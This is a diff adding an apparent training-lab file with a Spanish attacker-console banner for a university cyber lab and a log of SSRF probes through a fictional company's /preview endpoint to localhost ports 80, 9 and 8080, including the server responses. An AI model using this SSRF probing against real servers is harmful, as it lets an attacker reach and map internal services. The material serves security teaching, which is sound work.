@@ -1,0 +1,46 @@
+
+  ┌───────────────────────────────────────────────────────┐
+  │  CONSOLA DEL ATACANTE · CyberLab UTN FRVM              │
+  │                                                        │
+  │  Tools listas:  nmap  ncat  curl  whois  dig  python3  │
+  │  Guardá evidencia en /loot (se comparte con tu repo).  │
+  │  El target del lab activo se llama:  phantomcorp       │
+  │                                                        │
+  │  Probá para arrancar:   nmap -Pn phantomcorp           │
+  └───────────────────────────────────────────────────────┘
+UTC: 2026-11-20T02:15:15+00:00
+
+=== SSRF via /preview to http://127.0.0.1:80/ ===
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.13.5
+Date: Fri, 20 Nov 2026 02:15:15 GMT
+Content-Type: text/html; charset=utf-8
+
+<h3>Previsualizacion de http://127.0.0.1:80/</h3><hr><!doctype html><html><head><title>PhantomCorp — Portal</title></head>
+<body style="font-family:sans-serif;max-width:720px;margin:3em auto">
+<h1>PhantomCorp S.A.</h1>
+<p>Portal público. Novedades, carreras y contacto.</p>
+<hr>
+<h2>Herramientas para empleados</h2>
+<form action="/preview" method="get">
+  <label>Previsualizar URL:&nbsp;
+    <input name="url" size="48" placeholder="https://ejemplo.com"></label>
+  <button type="submit">Ver</button>
+</form>
+<p style="color:#777"><small>La previsualización la genera el servidor,
+así no navegás sitios raros desde tu máquina. — IT</small></p>
+</body></html>
+=== SSRF via /preview to http://127.0.0.1:9/ ===
+HTTP/1.0 502 Bad Gateway
+Server: BaseHTTP/0.6 Python/3.13.5
+Date: Fri, 20 Nov 2026 02:15:15 GMT
+Content-Type: text/html; charset=utf-8
+
+No pude traer http://127.0.0.1:9/: <urlopen error [Errno 111] Connection refused>
+=== SSRF via /preview to http://127.0.0.1:8080/ ===
+HTTP/1.0 502 Bad Gateway
+Server: BaseHTTP/0.6 Python/3.13.5
+Date: Fri, 20 Nov 2026 02:15:15 GMT
+Content-Type: text/html; charset=utf-8
+
+No pude traer http://127.0.0.1:8080/: <urlopen error [Errno 111] Connection refused>
